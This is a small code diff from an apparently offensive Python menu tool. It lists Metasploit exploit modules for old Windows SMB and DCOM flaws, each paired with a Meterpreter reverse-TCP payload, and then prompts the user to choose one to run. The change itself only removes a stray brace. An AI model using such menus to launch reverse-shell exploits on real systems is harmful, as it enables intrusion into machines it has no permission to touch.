@@ -541,8 +541,6 @@ def metasploit_scan():
                     "200": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                     "210": "exploit/windows/dcerpc/ms03_026_dcom set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                 }
-
-                }
                 for key, value in exploits.items():
                     print(f"{key}: {value}")
                 exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
